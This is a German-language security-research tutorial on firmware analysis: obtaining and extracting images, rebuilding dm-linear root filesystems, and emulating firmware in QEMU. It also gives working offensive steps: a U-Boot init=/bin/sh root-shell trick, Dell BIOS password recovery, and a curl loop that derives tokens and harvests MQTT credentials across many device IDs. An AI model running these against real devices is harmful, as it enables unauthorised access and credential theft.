# Firmware-Analyse

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Einführung**

### Verwandte Ressourcen

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ist essenzielle Software, die den korrekten Betrieb von Geräten ermöglicht, indem sie die Kommunikation zwischen den Hardwarekomponenten und der Software, mit der Benutzer interagieren, verwaltet und unterstützt. Sie wird im permanenten Speicher abgelegt, sodass das Gerät vom Einschalten an auf wichtige Anweisungen zugreifen kann und dadurch das Betriebssystem startet. Die Untersuchung und mögliche Änderung der Firmware ist ein entscheidender Schritt, um Sicherheitslücken zu identifizieren.<sup>[[2]](#references)[[3]](#references)</sup>

## **Informationen sammeln**

Das **Sammeln von Informationen** ist ein entscheidender erster Schritt, um den Aufbau eines Geräts und die darin verwendeten Technologien zu verstehen. Dabei werden Daten zu folgenden Punkten erfasst:

- CPU-Architektur und Betriebssystem
- Details zum Bootloader
- Hardwareaufbau und Datenblätter
- Kennzahlen zur Codebasis und Speicherorte des Quellcodes
- Externe Bibliotheken und Lizenztypen
- Update-Verläufe und behördliche Zertifizierungen
- Architektur- und Ablaufdiagramme
- Sicherheitsbewertungen und identifizierte Schwachstellen

Zu diesem Zweck sind **Open-Source-Intelligence (OSINT)**-Tools von unschätzbarem Wert. Ebenso hilfreich ist die Analyse verfügbarer Open-Source-Softwarekomponenten durch manuelle und automatisierte Prüfverfahren. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analysen, mit denen sich potenzielle Probleme finden lassen.

## **Firmware beschaffen**

Firmware lässt sich auf verschiedene Arten beschaffen, die jeweils unterschiedlich komplex sind:

- **Direkt** von der Quelle (Entwickler, Hersteller)
- **Erstellen** anhand bereitgestellter Anweisungen
- **Herunterladen** von offiziellen Support-Websites
- Mithilfe von **Google-dork**-Suchanfragen gehostete Firmware-Dateien finden
- **Cloud-Speicher** direkt aufrufen, etwa mit Tools wie [S3Scanner](https://github.com/sa7mon/S3Scanner)
- **Updates** mit Man-in-the-Middle-Techniken abfangen
- Firmware über Verbindungen wie **UART**, **JTAG** oder **PICit** aus dem Gerät **extrahieren**
- Im Geräteverkehr nach Update-Anfragen **schnüffeln**
- **Fest codierte Update-Endpunkte** identifizieren und verwenden
- Firmware aus dem Bootloader oder über das Netzwerk **dumpen**
- Wenn alle anderen Möglichkeiten scheitern, den Speicherchip mit geeigneten Hardware-Tools **ausbauen und auslesen**

### Nur UART-Logs: Eine Root-Shell über die U-Boot-Umgebungsvariablen im Flash erzwingen

Wenn UART RX ignoriert wird (nur Logs), lässt sich trotzdem eine Init-Shell erzwingen, indem der U-Boot-Umgebungsblock offline **bearbeitet** wird:<sup>[[6]](#references)</sup>

1. SPI-Flash mit einem SOIC-8-Clip und einem Programmer auslesen (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Finde die U-Boot-env-Partition, bearbeite `bootargs`, sodass `init=/bin/sh` enthalten ist, und **berechne die U-Boot-env-CRC32 für das Blob neu**.
3. Flashe nur die env-Partition neu und starte das Gerät neu; auf UART sollte eine shell erscheinen.

Das ist nützlich bei Embedded-Geräten, bei denen die Bootloader-shell deaktiviert, die env-Partition aber über externen Flash-Zugriff beschreibbar ist.

## Firmware analysieren

Nachdem du nun **die Firmware hast**, musst du Informationen darüber extrahieren, um zu wissen, wie du damit umgehen sollst. Dafür kannst du verschiedene Tools verwenden:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Wenn du mit diesen Tools nicht viel findest, überprüfe die **Entropie** des Images mit `binwalk -E <bin>`. Bei niedriger Entropie ist es wahrscheinlich nicht verschlüsselt. Bei hoher Entropie ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Außerdem kannst du mit diesen Tools **in der Firmware eingebettete Dateien** extrahieren:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder du kannst die Datei mit [**binvis.io**](https://binvis.io/#/) ([Code](https://code.google.com/archive/p/binvis/)) untersuchen.

### Differentielle Flash-Analyse und wiederherstellbare XOR-Geheimnisspeicher

Wenn für eine Firmware-Einstellung kein Speicherformat dokumentiert ist, fertige zunächst mehrere übereinstimmende Flash-Dumps an, ändere **genau eine** Einstellung, lies den gesamten Chip erneut aus und vergleiche die Offsets. Wiederhole das Experiment mit kontrollierten Werten, um die Einstellung von Zählern und Schreibmetadaten zu unterscheiden. Änderungen an neuen statt an bereits vorhandenen Offsets deuten auf einen nur anhängenden oder logstrukturierten Speicher hin. Behalte gelöschte bzw. als gelöscht markierte Einträge bei, da ihre Nutzdaten möglicherweise wiederhergestellt werden können.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nach dem Auffinden des Bereichs extrahieren Sie die Firmware-Module mit Tools wie `binwalk` und reverse-engineeren Sie den Writer/Validator in Ghidra. Bestätigen Sie Feldgrenzen, Padding, Key-Indexierung und Key-Ableitung im Code, anstatt das Verfahren nur anhand von Chiffretextmustern abzuleiten.<sup>[[12]](#references)</sup>

#### Schlüssel aus verschlüsseltem Zero-Padding wiederherstellen

Wie unter [XOR-basierte Verschlüsselung](../../crypto/symmetric/#xor-based-encryption) beschrieben, gibt bekannter Klartext Keystream-Bytes an denselben Offsets preis. Ein Feld mit fester Größe ist besonders anfällig, wenn sein Zero-Padding jeden Index eines sich wiederholenden XOR-Schlüssels abdeckt: Das verschlüsselte Padding gibt diese Schlüsselbytes direkt preis, da `0x00 XOR key_byte = key_byte`. Wenn jeder Schlüsselindex abgedeckt ist, rekonstruieren Sie den Schlüssel aus dem Chiffretext am Ende des Felds und entschlüsseln Sie die gespeicherten Bytes.<sup>[[12]](#references)</sup>

Das verwundbare DVAR-BIOS-Passwortformat von Dell ist ein konkretes Beispiel: Byte `0` eines 32-Byte-Felds liegt im Klartext vor, während für die Bytes `1..31` ein sich wiederholender 20-Byte-Schlüssel verwendet wird.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Bei einer Passwortlänge `L` waren die Positionen `L..31` vor dem XOR null. Wenn `L <= 12` gilt, decken diese Positionen jeden Schlüsselindex ab, sodass der vollständige Schlüssel und das Passwort ohne Brute-Force wiederhergestellt werden:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Schlüssel aus historischen Datensätzen gewinnen

Analysieren Sie nicht jeden Datensatz einzeln. Der DVAR-Schlüssel wird ungefähr so abgeleitet: `modified_md5(device_seed || variable_GUID || password[0])`: Der Device Seed und die GUID sind fest, und die einzige passwortabhängige Eingabe ist das erste Klartextbyte. Dadurch gibt es pro Gerät höchstens 256 Schlüssel, und Datensätze, die mit demselben Byte beginnen, verwenden denselben Schlüssel. Gruppieren Sie aktive und gelöschte Datensätze nach diesem Byte; ein kurzer historischer Datensatz kann den vollständigen Schlüssel über das Padding preisgeben und damit einen aktuellen, längeren Datensatz entschlüsseln, dessen Padding dafür nicht ausreicht. Eine Passwortrotation kann die Offenlegung daher verstärken, wenn alter Ciphertext als gelöscht markiert statt gelöscht wird.<sup>[[12]](#references)</sup>

Das Tool [`dellpwn`](https://github.com/R3n5k1/dellpwn) findet DVAR, validiert mögliche Datensätze, stellt Passwörter wieder her und kann rohe gespeicherte Schlüsselbytes anzeigen. Erstellen Sie es aus einem Checkout und scannen Sie ein verifiziertes Flash-Image wie folgt:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Für benutzerdefinierte Parser lassen sich Fehlalarme anhand der Datensatzstruktur, Anforderungen an druckbare Zeichen, Prüfungen auf Nullauffüllung, Schlüsselentropie und Konsistenz beim Umlaufen des Schlüssels zurückweisen. Wenn wiederholte Dumps spärliche Bitflips pro Schreibvorgang zeigen, liste die beobachteten Masken auf und ordne mögliche Korrekturen anhand dieser Einschränkungen. Gib jedoch mehrdeutige Zeichen als solche an, statt heuristische Ergebnisse als exakte Wiederherstellung darzustellen.<sup>[[12]](#references)</sup>

Passwortprüfer sollten statt reversibler Chiffretexte einen gesalzenen, iterierten Einweg-Hash speichern, und logstrukturierte Speicher sollten veraltetes geheimes Material sicher entfernen.<sup>[[12]](#references)</sup>

### Dateisystem extrahieren

Mit den zuvor kommentierten Tools wie `binwalk -ev <bin>` solltest du das **Dateisystem extrahiert** haben können.\
Binwalk extrahiert es normalerweise in einem **Ordner mit dem Namen des Dateisystemtyps**, der üblicherweise einer der folgenden ist: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuelle Dateisystemextraktion

Manchmal enthält binwalk **das Magic-Byte des Dateisystems nicht in seinen Signaturen**. Verwende in diesen Fällen binwalk, um **den Offset des Dateisystems zu finden und das komprimierte Dateisystem** aus der Binärdatei zu carven, und **extrahiere** das Dateisystem anhand seines Typs **manuell** mit den folgenden Schritten.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Führe den folgenden **dd-Befehl** aus, um das Squashfs-Dateisystem zu extrahieren.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativ kann auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (wie im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich danach im Verzeichnis "`squashfs-root`".

- CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Zusammengesetzte eingebettete Root-Dateisysteme rekonstruieren

Wenn ein roher eMMC-/SSD-Dump einen gültigen Dateisystem-Header enthält, sich die Metadaten-Offsets aber über die nominelle Partition hinaus erstrecken, sollte er nicht sofort als beschädigt eingestuft werden. Eingebetteter Boot-Code kann das tatsächliche Root-Device mithilfe von Device Mapper aus mehreren physischen Bereichen zusammensetzen, sodass das Carving einer einzelnen GPT-Partition nur das erste Segment ergibt.<sup>[[9]](#references)</sup>

#### Das vollständige Medienabbild prüfen

Vergewissere dich zunächst, dass die Erfassung abgeschlossen ist, die Größe stabil bleibt und kein Schreibprozess mehr auf das Abbild zugreift. Wenn der Dateiname eine Start-/Endadresse enthält, vergleiche diesen Bereich mit der tatsächlichen Byteanzahl. Stelle die GPT im Nur-Lese-Modus wieder her und binde nur den erforderlichen Bereich ein; führe **nicht** `vgchange -ay` für ein nicht vertrauenswürdiges physisches Volume auf der Workstation aus, da es zu Konflikten zwischen Volume Groups und unbeabsichtigten Schreibvorgängen kommen kann.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Verwende eine wegwerfbare VM, wenn die ursprüngliche Init-Logik oder ein LVM-Stack das gesamte Image sehen muss. Historische Boot-Logs einer standardmäßigen Boot-Partition sind besonders nützlich: Der Bootloader hat möglicherweise Offsets proprietärer Container, Komponentenlängen, Slot-Auswahl, Ausrichtungsregeln und Signaturprüfungen protokolliert. Verwende diese Werte, um eine eingebettete Command Line, einen Kernel und ein Initramfs herauszulösen, und überprüfe jede Ausgabe anschließend separat mit `file`, Magic Bytes und `binwalk`; das Lesen bis zum Ende des Containers kann versehentlich ein initrd, ein ACPI-Objekt oder eine Signatur an den Kernel anhängen.<sup>[[9]](#references)</sup>

#### Die Blockzuordnung zur Bootzeit rekonstruieren

Extrahiere das Initramfs des Kernels und analysiere dessen `/init` sowie alle Storage-Bibliotheken rückwärts. Suche in [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) nach String-Referenzen auf `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` und Partitionspfade; verfolge dann den Code, der den aktiven A/B-Slot auswählt und die Tabelle erstellt. Nützliche Einstiegspunkte in radare2 sind `r2 -A init`, `afl`, `pdf @ main` und `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Das linear target ordnet aufeinanderfolgende Bereiche eines virtuellen Geräts Bereichen eines oder mehrerer zugrunde liegender Geräte zu. Eine rekonstruierte Tabelle mit zwei Segmenten sieht häufig so aus (alle Positionen und Längen sind in 512-Byte-Sektoren angegeben):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduziere die Maschinenarithmetik exakt, einschließlich Integer-Breite, Shifts und Einheitenumrechnungen. Der folgende Ausdruck rundet beispielsweise eine Byte-Größe zunächst auf eine 4-KiB-Grenze ab und rechnet sie erst danach in 512-Byte-Sektoren um; ersetzt man ihn durch `p4_bytes // 512`, verschiebt sich das ausgewählte Ende um `p4_bytes % 4096`, wenn die Partition nicht seitenausgerichtet ist.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Rekonstruiere ein flaches Analyse-Image, indem du die Bereiche in Tabellenreihenfolge mit begrenzten Chunks kopierst, statt den vollständigen Media-Dump in den Speicher zu laden. Dadurch werden auch hostseitige Mapper-Geräte vermieden. Behalte die aus GPT abgeleiteten Offsets, die umgekehrten Sektoranzahlen und die resultierende Ausgabelänge als separate Assertions bei.<sup>[[9]](#references)</sup>

#### Korruption von einem konstanten Rekonstruktionsfehler unterscheiden

Prüfe bei SquashFS vor dem Ausführen von `unsquashfs` die Magic `hsqs` und dekodiere das little-endian 64-Bit-Feld `bytes_used` am Superblock-Offset 40. Wenn die Extraktion in mehreren unabhängigen Strukturen fehlschlägt, durchsuche ein breites Fenster um die erwarteten Positionen und verlange starke strukturelle Kandidaten: einen dekomprimierbaren Metadatenblock, mehrere aufeinanderfolgende gültige Verzeichniseinträge, plausible Inode-Felder, einen Root-Inode, der mit der Inode-Anzahl übereinstimmt, oder eine gültige Integritätsmetadatenstruktur. Ein einzelner Magic-Treffer reicht nicht aus.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wenn derselbe signierte Delta-Wert unabhängige Strukturen gültig macht – etwa Verzeichnis-Metadaten und einen Verity-Datensatz –, liegt die wahrscheinliche Ursache eher in einem systematischen Fehler beim Segmentstart als in fehlenden Bytes. Kehren Sie zur umgekehrten Berechnung zurück und suchen Sie nach verworfenen Resten, falscher Vorzeichenbehandlung, Überläufen oder Rundungen auf Sektor- oder Seitengrößen, bevor Sie versuchen, verwaiste Daten wiederherzustellen oder Dateisystem-Metadaten zu patchen.<sup>[[9]](#references)</sup>

Halten Sie schließlich die Schutzmechanismen getrennt: TPM-versiegelte LUKS-Volumes schützen die Vertraulichkeit der Daten, während ein signiertes dm-verity-Mapping die Integrität des Root-Dateisystems schützt. Ein Software-TPM kann keinen Schlüssel wiederherstellen, der an das ursprüngliche physische TPM gebunden ist. Und das Starten eines modifizierten SquashFS über ein ausschließlich für Forschungszwecke vorgesehenes init, das die Verity-Prüfung auslässt, fälscht weder dessen Signatur noch bricht es dm-verity.<sup>[[9]](#references)</sup>

## Firmware analysieren

Sobald die Firmware vorliegt, muss sie gründlich untersucht werden, um ihren Aufbau und mögliche Schwachstellen zu verstehen. Dazu werden verschiedene Tools eingesetzt, um das Firmware-Image zu analysieren und wertvolle Daten daraus zu extrahieren.

### Tools für die erste Analyse

Zur ersten Untersuchung der Binärdatei (im Folgenden als `<bin>` bezeichnet) stehen mehrere Befehle zur Verfügung. Sie helfen dabei, Dateitypen zu identifizieren, Strings zu extrahieren, Binärdaten zu analysieren und Details zu Partitionen und Dateisystemen zu ermitteln:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Um den Verschlüsselungsstatus des Images zu beurteilen, wird die **Entropie** mit `binwalk -E <bin>` geprüft. Eine niedrige Entropie deutet auf fehlende Verschlüsselung hin, während eine hohe Entropie auf mögliche Verschlüsselung oder Komprimierung hindeutet.

Zum Extrahieren **eingebetteter Dateien** werden Tools und Ressourcen wie die Dokumentation zu **file-data-carving-recovery-tools** und **binvis.io** zur Dateiprüfung empfohlen.

### Dateisystem extrahieren

Mit `binwalk -ev <bin>` lässt sich das Dateisystem in der Regel extrahieren, oft in ein Verzeichnis, das nach dem Dateisystemtyp benannt ist (z. B. squashfs, ubifs). Wenn **binwalk** den Dateisystemtyp jedoch aufgrund fehlender Magic Bytes nicht erkennt, ist eine manuelle Extraktion erforderlich. Dazu wird mit `binwalk` der Offset des Dateisystems ermittelt und anschließend das Dateisystem mit dem Befehl `dd` herausgeschnitten:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Anschließend werden je nach Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) unterschiedliche Befehle verwendet, um die Inhalte manuell zu extrahieren.

### Dateisystemanalyse

Sobald das Dateisystem extrahiert wurde, beginnt die Suche nach Sicherheitslücken. Dabei wird auf unsichere Netzwerkdienste, fest codierte Zugangsdaten, API-Endpunkte, Update-Server-Funktionen, nicht kompilierten Code, Startskripte und kompilierte Binärdateien für die Offline-Analyse geachtet.

Zu den **wichtigen Orten** und **Elementen**, die untersucht werden sollten, gehören:

- **etc/shadow** und **etc/passwd** auf Benutzerzugangsdaten
- SSL-Zertifikate und -Schlüssel in **etc/ssl**
- Konfigurations- und Skriptdateien auf potenzielle Schwachstellen
- Eingebettete Binärdateien zur weiteren Analyse
- Gängige Webserver und Binärdateien von IoT-Geräten

Verschiedene Tools helfen dabei, sensible Informationen und Schwachstellen im Dateisystem aufzudecken:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) zum Suchen nach sensiblen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) zur umfassenden Firmware-Analyse
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) und [**EMBA**](https://github.com/e-m-b-a/emba) zur statischen und dynamischen Analyse

### Sicherheitsprüfungen für kompilierte Binärdateien

Sowohl im Dateisystem gefundener Quellcode als auch kompilierte Binärdateien müssen auf Schwachstellen untersucht werden. Tools wie **checksec.sh** für Unix-Binärdateien und **PESecurity** für Windows-Binärdateien helfen dabei, ungeschützte Binärdateien zu identifizieren, die ausgenutzt werden könnten.

## Cloud-Konfigurationen und MQTT-Zugangsdaten über abgeleitete URL-Tokens abrufen

Viele IoT-Hubs beziehen ihre gerätespezifische Konfiguration von einem Cloud-Endpunkt, der etwa so aussieht:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Bei der Firmware-Analyse stellt sich möglicherweise heraus, dass `<token>` lokal aus der Geräte-ID und einem fest codierten geheimen Schlüssel abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Dadurch kann jeder, der eine deviceId und den STATIC_KEY kennt, die URL rekonstruieren und die Cloud-Konfiguration abrufen. Diese enthält häufig MQTT-Zugangsdaten im Klartext und Topic-Präfixe.

Praktischer Ablauf:

1) deviceId aus UART-Bootprotokollen extrahieren

- Einen 3,3-V-UART-Adapter (TX/RX/GND) anschließen und die Protokolle mitschneiden:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Suchen Sie nach Zeilen, die das Cloud-Konfigurations-URL-Muster und die Broker-Adresse ausgeben, zum Beispiel:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) STATIC_KEY und Token-Algorithmus aus der Firmware wiederherstellen

- Lade die Binärdateien in Ghidra/radare2 und suche nach dem Konfigurationspfad ("/pf/") oder der Verwendung von MD5.
- Bestätige den Algorithmus (z. B. MD5(deviceId||STATIC_KEY)).
- Leite das Token in Bash ab und wandle den Digest in Großbuchstaben um:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud-Konfiguration und MQTT-Zugangsdaten sammeln

- URL zusammensetzen und JSON mit curl abrufen; mit jq die Geheimnisse extrahieren:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Klartext-MQTT und schwache Topic-ACLs ausnutzen (falls vorhanden)

- Mit wiederhergestellten Zugangsdaten Wartungs-Topics abonnieren und nach sensiblen Ereignissen suchen:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Vorhersehbare Geräte-IDs auflisten (in großem Umfang, mit Genehmigung)

- Viele Ökosysteme betten Hersteller-OUI-, Produkt- und Typ-Bytes ein, gefolgt von einem fortlaufenden Suffix.
- Sie können mögliche IDs durchlaufen, Tokens ableiten und Konfigurationen programmgesteuert abrufen:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Hinweise
- Hole immer eine ausdrückliche Genehmigung ein, bevor du mit einer Massenerfassung beginnst.
- Bevorzuge Emulation oder statische Analyse, um Geheimnisse wiederherzustellen, ohne die Zielhardware zu verändern, wenn dies möglich ist.


Die Emulation von Firmware ermöglicht eine **dynamische Analyse** des Betriebs eines Geräts oder eines einzelnen Programms. Dabei kann es zu Herausforderungen durch Hardware- oder Architekturabhängigkeiten kommen. Die Übertragung des Root-Dateisystems oder bestimmter Binärdateien auf ein Gerät mit passender Architektur und Byte-Reihenfolge, etwa einen Raspberry Pi, oder auf eine vorgefertigte virtuelle Maschine kann jedoch weitere Tests ermöglichen.

### Einzelne Binärdateien emulieren

Bei der Untersuchung einzelner Programme ist es entscheidend, die Byte-Reihenfolge und die CPU-Architektur des Programms zu ermitteln.

#### Beispiel mit MIPS-Architektur

Um eine Binärdatei für eine MIPS-Architektur zu emulieren, kann folgender Befehl verwendet werden:

```bash
file ./squashfs-root/bin/busybox
```

Und um die erforderlichen Emulationstools zu installieren:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Für MIPS (Big-Endian) wird `qemu-mips` verwendet; für Little-Endian-Binärdateien kommt `qemu-mipsel` infrage.

#### Emulation der ARM-Architektur

Bei ARM-Binärdateien ist der Prozess ähnlich; für die Emulation wird der Emulator `qemu-arm` verwendet.

### Vollständige Systememulation

Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) und andere ermöglichen die vollständige Firmware-Emulation, automatisieren den Prozess und unterstützen die dynamische Analyse.

### Rekonstruktion aufgeteilter und verifizierter Root-Dateisysteme für die Emulation

Wenn ein SquashFS-Superblock lesbar ist, aber die Offsets der Inodes, Verzeichnisse oder Fragmenttabellen unmöglich erscheinen, sollte `unsquashfs` nicht sofort gepatcht werden. Reverse-engineere stattdessen die frühe Boot-Binärdatei und bilde den von ihr erstellten Blockgerätegraphen nach: Eingebettete Systeme können zwar eine nominelle Root-Partition bereitstellen, das tatsächliche Dateisystem jedoch über ein `dm-linear`-Mapping erstellen, das Sektoren aus einer anderen Partition anhängt. Prüfungen, die nur den Superblock berücksichtigen, können erfolgreich sein, obwohl alle nachfolgenden Metadatenblöcke verschoben sind.<sup>[[11]](#references)</sup>

Behalte die Arithmetik der Firmware exakt bei. Ermittle insbesondere, ob Längen in Bytes, 512-Byte-Sektoren oder 4-KiB-Seiten angegeben sind; bilde Verschiebungen und Abschneidungen in der ursprünglichen Reihenfolge nach; und berücksichtige bankabhängige Endbereiche in A/B-Layouts. Beispielsweise rundet `(partition_bytes >> 12) << 3` zunächst auf eine 4-KiB-Grenze ab und gibt das Ergebnis erst danach in 512-Byte-Sektoren an. Ersetzt man dies durch `partition_bytes // 512`, kann sich der angehängte Bereich um einige Kilobytes verschieben und alle nachgelagerten SquashFS-Tabellen beschädigen.<sup>[[11]](#references)</sup>

Ein nützlicher Validierungsablauf ist:<sup>[[11]](#references)</sup>

1. Ermittle aus der Verifier-/Init-Binärdatei für jedes `dm-linear`-Segment das Quelldatenträgergerät, den Startsektor und die Länge.
2. Verknüpfe oder mappe die Bereiche, ohne ihre Ausrichtungssemantik zu verändern.
3. Falls die Extraktion weiterhin fehlschlägt, durchsuche nur ein kleines Fenster um die vorhergesagte Grenze und verlange mehrere aufeinanderfolgende gültige Metadatenstrukturen, statt einen plausiblen Superblock allein als ausreichend anzusehen.
4. Führe ein unverändertes `unsquashfs` auf dem rekonstruierten Image aus. Die erfolgreiche Durchquerung aller Verzeichnisse und Fragmente ist ein stärkerer Beleg als `unsquashfs -stat`.

#### Vom Analysten kontrollierter dm-verity-Ersatz

Wenn der Analyst den QEMU-Kernel, das initramfs und die virtuellen Datenträger kontrolliert, kann ein modifiziertes Root-Dateisystem gestartet werden, indem die Verifizierungs-PID 1 des Herstellers durch ein kleines, statisch gelinktes Init ersetzt wird. Dies ist eine **Boot-Chain-Ersetzung in einer Laborumgebung** und kein Bruch von dm-verity, seiner RSA-Signatur, Secure Boot oder einem TPM-geschützten Schlüssel.<sup>[[11]](#references)</sup>

Das Ersatz-Init sollte die wesentlichen Abläufe des ursprünglichen Bootpfads nachbilden: `devtmpfs` mounten, `setsid()` aufrufen, `/dev/console` mit den Dateideskriptoren 0–2 verbinden, `/proc` und `/sys` mounten, auf das bereitgestellte Blockgerät warten, das bearbeitete Root-Dateisystem schreibgeschützt mounten, die Pseudo-Dateisysteme des alten Root-Dateisystems aushängen, den neuen Mount auf `/` verschieben, `chroot` ausführen und das ursprüngliche `/sbin/init` der Firmware mit `execve()` starten. Wenn `/dev`, `/proc` und `/sys` **vor** `MS_MOVE` ausgehängt werden, wird verhindert, dass versehentlich Mountpoints aus dem neuen Root-Dateisystem ausgehängt werden.<sup>[[11]](#references)</sup>

Halte den veränderlichen Gerätezustand vom modifizierten, unveränderlichen Root-Dateisystem getrennt. Ein qcow2-Overlay kann den LVM-Zustand des ursprünglichen Datenträgers erhalten, während ein zweiter schreibgeschützter virtio-Datenträger das bearbeitete SquashFS bereitstellt:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Offline-Debugging des Image-Zustands

